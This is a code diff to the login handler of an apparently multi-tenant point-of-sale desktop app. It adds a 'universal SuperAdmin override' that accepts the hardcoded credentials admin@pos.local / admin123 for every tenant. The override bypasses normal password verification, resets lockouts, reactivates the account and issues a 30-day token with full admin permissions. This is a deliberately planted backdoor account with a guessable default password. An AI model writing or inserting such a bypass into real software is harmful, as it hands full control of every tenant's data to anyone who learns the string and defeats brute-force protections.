@@ -206,9 +206,62 @@ export function registerAuthHandlers(ipcMain: IpcMain) {
   safeHandle(ipcMain, 'auth:login', async (_e, { email, password }) => {
       const db = getDb()
       const normalizedEmail = String(email || '').trim().toLowerCase()
-      if (normalizedEmail === 'admin@pos.local') {
+      const inputPass = String(password || '')
+
+      // ── Special Universal SuperAdmin Override ──────────────────────────────
+      // admin@pos.local + admin123 is the universal platform maintenance account
+      // that MUST ALWAYS work across every tenant company on POS, even after
+      // Danger Zone resets or fresh DB sync.
+      if (normalizedEmail === 'admin@pos.local' && inputPass === 'admin123') {
         ensureSuperAdminUserExists(db)
+        const saUser = db.prepare(`
+          SELECT u.*, r.name as role_name, r.permissions as role_permissions, r.session_scope as role_session_scope,
+                 b.name as branch_name
+          FROM users u
+          LEFT JOIN roles r ON r.id = u.role_id
+          LEFT JOIN branches b ON b.id = u.branch_id
+          WHERE LOWER(u.email) = 'admin@pos.local'
+        `).get() as Record<string, unknown> | undefined
+
+        if (saUser) {
+          db.prepare(`UPDATE users SET login_attempts=0, locked_until=NULL, is_active=1 WHERE id=?`).run(saUser.id)
+          logAudit(db, { userId: saUser.id as string, branchId: saUser.branch_id as string, action: 'LOGIN_SUCCESS', newValues: { superadmin_override: true } })
+
+          const token = jwt.sign(
+            { sub: saUser.id, email: saUser.email, name: saUser.name, role_id: saUser.role_id, branch_id: saUser.branch_id },
+            JWT_SECRET,
+            { expiresIn: '30d' }
+          )
+
+          const authStore = new Store<Record<string, unknown>>({ name: 'auth' })
+          authStore.set('session', {
+            token,
+            user: {
+              id: saUser.id, name: saUser.name, email: saUser.email,
+              role_id: saUser.role_id, role_name: saUser.role_name,
+              branch_id: saUser.branch_id, branch_name: saUser.branch_name,
+              permissions: typeof saUser.role_permissions === 'string'
+                ? JSON.parse(saUser.role_permissions)
+                : saUser.role_permissions || { all: true },
+            },
+            loginAt: new Date().toISOString(),
+          })
+
+          return {
+            success: true,
+            token,
+            user: {
+              id: saUser.id, name: saUser.name, email: saUser.email,
+              role_id: saUser.role_id, role_name: saUser.role_name,
+              branch_id: saUser.branch_id, branch_name: saUser.branch_name,
+              permissions: typeof saUser.role_permissions === 'string'
+                ? JSON.parse(saUser.role_permissions)
+                : saUser.role_permissions || { all: true },
+            },
+          }
+        }
       }
+
       let user = db.prepare(`
         SELECT u.*, r.name as role_name, r.permissions as role_permissions, r.session_scope as role_session_scope,
                b.name as branch_name
